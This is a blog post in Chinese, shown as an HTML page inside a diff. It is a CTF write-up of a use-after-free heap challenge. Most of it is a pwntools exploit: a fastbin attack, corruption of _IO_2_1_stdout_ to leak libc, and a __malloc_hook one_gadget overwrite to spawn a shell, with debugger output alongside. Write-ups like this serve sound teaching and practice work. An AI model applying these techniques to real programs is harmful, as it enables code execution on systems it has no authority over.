@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>wp uaf | I0gan</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="UAF来源V&amp;N cnitlrt的面试,这是我自己按他要求出的题,然后自己打. 难度5 &#x2F; 10 保护 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled  简单描述只有添加和删除功能, 添加的时候输入大小,再">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wp uaf">
+<meta property="og:url" content="http://blog.i0gan.cn/2020/05/06/wp-uaf/index.html">
+<meta property="og:site_name" content="I0gan">
+<meta property="og:description" content="UAF来源V&amp;N cnitlrt的面试,这是我自己按他要求出的题,然后自己打. 难度5 &#x2F; 10 保护 12345Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled  简单描述只有添加和删除功能, 添加的时候输入大小,再">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-05-06T10:43:15.000Z">
+<meta property="article:modified_time" content="2020-09-15T10:04:10.000Z">
+<meta property="article:author" content="i0gan">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">I0gan</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-wp-uaf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/05/06/wp-uaf/" class="article-date">
+  <time datetime="2020-05-06T10:43:15.000Z" itemprop="datePublished">2020-05-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      wp uaf
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>V&amp;N cnitlrt的面试,这是我自己按他要求出的题,然后自己打.</p>
+<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>5 / 10</p>
+<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>只有添加和删除功能, 添加的时候输入大小,再输入内容, 而删除根据索引进行删除.</p>
+<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;pheap + <span class="number">2</span> * v1)); <span class="comment">//  UAF漏洞</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>fastbin attack, IO_FILE</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>开辟一个small bin, 然后通过fastbin attack partial write 修改unsoted bin 的 fd 的后两字节指向<code>_IO_2_1_stderr</code> + 157处, 使用fastbin attack_IO_2_1_stdout`结构体中泄漏libc, 再次使用fastbin attack 打入malloc_hook - 0x23处打one_gadget, realloc的push次数调整execve第二个参数, 打通概率 1 /16</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;2.del&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;2.del&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))	</span><br><span class="line">	</span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	a = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 0 为了使用fastbin attack打入unsoted bin-0x10处</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x50</span></span><br><span class="line">   <span class="comment">#伪造的堆块,后面要申请到此处来实现修改chunk 2的size和fd</span></span><br><span class="line">p += p64(<span class="number">0</span>) <span class="comment"># prev_size</span></span><br><span class="line">p += p64(<span class="number">0x31</span>) <span class="comment"># size</span></span><br><span class="line"></span><br><span class="line">ad(<span class="number">0x60</span>, p) <span class="comment"># idx 1</span></span><br><span class="line">ad(<span class="number">0x80</span>, <span class="string">&#x27;B&#x27;</span>) <span class="comment"># idx 2 为了partiwritefast bin attack实现打入_IO_2_1_stderr + 157处</span></span><br><span class="line">ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 3 为了使用fastbin attack打入unsoted bin-0x10处</span></span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 4 为了与修改后的chunk 2在fastbin中连接起来,然后就可以实现打入IO_2_1_stdout中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for fastbin attack to _free_hook</span></span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 5 为了fastbin attac 打入malloc_hook - 0x23</span></span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 6 为了fastbin attac 打入malloc_hook - 0x23</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="打入chunk-2修改size-和fd"><a href="#打入chunk-2修改size-和fd" class="headerlink" title="打入chunk 2修改size 和fd"></a>打入chunk 2修改size 和fd</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rm(<span class="number">3</span>) <span class="comment"># 为了 构造fastbin attack</span></span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">rm(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">rm(<span class="number">2</span>) <span class="comment"># 先释放掉chunk 2,使fd 为main_arena + 0x58</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 这里采用partial write 方式修改 chunk 3中的fd指向 chunk 2 - 0x10处，这里是我们伪造好的堆块</span></span><br><span class="line">   ad(<span class="number">0x20</span>, <span class="string">&#x27;\x90&#x27;</span>) <span class="comment"># attack to chunk 2 - 0x10</span></span><br><span class="line"></span><br><span class="line">ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 调整</span></span><br><span class="line">ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># 调整</span></span><br><span class="line"></span><br><span class="line">   <span class="comment"># 修改chunk 2 的size和fd</span></span><br><span class="line">p = p64(<span class="number">0</span>)</span><br><span class="line">p += p64(<span class="number">0x71</span>)  <span class="comment"># 修改为fastbin, 绕过检查</span></span><br><span class="line">p += <span class="string">&#x27;\xdd\x25&#x27;</span> <span class="comment"># partial write指向_IO_2_1_stderr + 157处</span></span><br><span class="line">ad(<span class="number">0x20</span>, p) <span class="comment"># patial write to _IO_2_1_stderr_ + 157</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="打入-IO-2-1-stderr-157处"><a href="#打入-IO-2-1-stderr-157处" class="headerlink" title="打入_IO_2_1_stderr + 157处"></a>打入_IO_2_1_stderr + 157处</h3><p>满足size调试如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x &#x2F;40gx (long int)&amp;_IO_2_1_stdout_ - 0x43</span><br><span class="line">0x7f007e1fe5dd &lt;_IO_2_1_stderr_+157&gt;:	0x007e1fd660000000	0x000000000000007f</span><br><span class="line">0x7f007e1fe5ed &lt;_IO_2_1_stderr_+173&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f007e1fe5fd &lt;_IO_2_1_stderr_+189&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f007e1fe60d &lt;_IO_2_1_stderr_+205&gt;:	0x0000000000000000	0x007e1fc6e0000000</span><br><span class="line">0x7f007e1fe61d &lt;_IO_2_1_stderr_+221&gt;:	0x00fbad288700007f	0x007e1fe6a3000000</span><br><span class="line">0x7f007e1fe62d &lt;_IO_2_1_stdout_+13&gt;:	0x007e1fe6a300007f	0x007e1fe6a300007f</span><br><span class="line">0x7f007e1fe63d &lt;_IO_2_1_stdout_+29&gt;:	0x007e1fe6a300007f	0x007e1fe6a300007f</span><br><span class="line">0x7f007e1fe64d &lt;_IO_2_1_stdout_+45&gt;:	0x007e1fe6a300007f	0x007e1fe6a300007f</span><br><span class="line">0x7f007e1fe65d &lt;_IO_2_1_stdout_+61&gt;:	0x007e1fe6a400007f	0x000000000000007f</span><br></pre></td></tr></table></figure>
+
+<p>把刚才所构建的fastbin chunk 2放入fastbin 中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin attack to _IO__2_1_stderr + 157</span></span><br><span class="line">   <span class="comment"># 为了 构造fastbin attack</span></span><br><span class="line">rm(<span class="number">4</span>)</span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line">rm(<span class="number">4</span>)</span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;\xa0&#x27;</span>) <span class="comment"># 将fastbin chunk 2放入fastbin 中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for alignment</span></span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h3><p>修改<code>_IO_2_1_stdout</code>结构体实现打印出libc中的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x33</span></span><br><span class="line">   <span class="comment"># _IO_2_1_stdout_ struct</span></span><br><span class="line">p += p64(<span class="number">0xfbad3c80</span>) <span class="comment"># _IO_2_1_stdout_ flag</span></span><br><span class="line">p += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">p += p8(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">ad(<span class="number">0x60</span>, p)</span><br><span class="line">lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - (<span class="number">0x7ffff7dd2608</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="打入-malloc-hook-0x23处"><a href="#打入-malloc-hook-0x23处" class="headerlink" title="打入__malloc_hook - 0x23处"></a>打入__malloc_hook - 0x23处</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fast bin attack to malloc_hook - 0x23</span></span><br><span class="line">   <span class="comment"># 为了 构造fastbin attack</span></span><br><span class="line">rm(<span class="number">5</span>)	</span><br><span class="line">rm(<span class="number">6</span>)	</span><br><span class="line">rm(<span class="number">5</span>)	</span><br><span class="line"></span><br><span class="line">p = p64(lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)</span><br><span class="line">ad(<span class="number">0x68</span>, p)</span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># for ajust</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># for ajust</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="修改malloc-hook-和realloc-hook打one-gadget"><a href="#修改malloc-hook-和realloc-hook打one-gadget" class="headerlink" title="修改malloc_hook 和realloc_hook打one_gadget"></a>修改malloc_hook 和realloc_hook打one_gadget</h3><p>通过realloc的push次数来调整execve的第二个参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = lib.address + gadget[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x13</span> <span class="number">-8</span>)</span><br><span class="line">p += p64(one_gadget)</span><br><span class="line">p += p64(lib.sym[<span class="string">&#x27;realloc&#x27;</span>] + <span class="number">12</span>)</span><br><span class="line">ad(<span class="number">0x68</span>, p)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get shell</span></span><br><span class="line">ru(<span class="string">&#x27;del&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : 